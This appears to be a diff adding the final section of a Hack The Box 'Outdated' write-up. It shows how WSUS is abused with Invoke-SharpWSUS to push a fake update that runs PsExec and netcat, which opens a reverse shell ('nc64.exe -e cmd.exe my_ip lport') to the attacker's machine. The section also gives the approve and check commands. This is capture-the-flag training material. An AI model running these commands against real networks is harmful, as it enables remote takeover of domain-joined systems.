@@ -469,4 +469,32 @@ I was checking for the steps to exploit & landed into these websites, ref : http
 ![image](https://user-images.githubusercontent.com/87700008/208905175-d61ea658-7117-4c89-8143-230d5bdd9492.png)
 
 
+So, I followed the steps to root the box & used the PowerShell script of SharpWSUS, which I downloaded from : https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpWSUS.ps1
 
+Then I transferred the file "Invoke-SharpWsus.ps1" into the box & invoked the script first, after the SharpWsus is working fine.
+
+![image](https://user-images.githubusercontent.com/87700008/208944247-84d6ad03-b562-4da6-90b9-1a300019d5b9.png)
+
+Then to check the further information about the clients using the WSUS I ran this :
+
+        Invoke-SharpWsus inspect
+        
+![image](https://user-images.githubusercontent.com/87700008/208945092-5720525c-7061-4ddc-9db2-e992d272d8da.png)
+
+After that I used ran this command with SharpWsus to perform the update with the netcat binary (I transferred into the machine) & run a specific command with netcat to connect back to my kali machine :
+
+        Invoke-SharpWsus create /payload:"C:\Users\sflowers\Desktop\PsExec64.exe" /args:"-accepteula -s -d C:\Users\sflowers\Desktop\nc64.exe -e cmd.exe my_ip lport" /title:"Shell"
+        
+![image](https://user-images.githubusercontent.com/87700008/208945903-ef420d67-f946-40f4-9eb8-ff5ad91ef60d.png)
+
+After running the above command I got information to run some more commands to approve my WSUS action & to check wether the updated is completed or not & I ran them accordingly:
+
+        Invoke-SharpWsus approve /updateid:4f1fae1d-35ab-4c31-999a-0053d1c39a4b /computername:DC.outdated.htb /groupname:"Shell"
+        
+        Invoke-SharpWsus check /updateid:4f1fae1d-35ab-4c31-999a-0053d1c39a4b /computername:DC.outdated.htb
+        
+After 2 min I got confirmation that the update is installed & I also got a reverse shell in my attackbox : (pwn3d!🙂)
+
+![image](https://user-images.githubusercontent.com/87700008/208946654-8a39b76d-f656-4cff-9d8c-4940d05140c8.png)
+
+Got the root flag after this in Admin desktop folder.
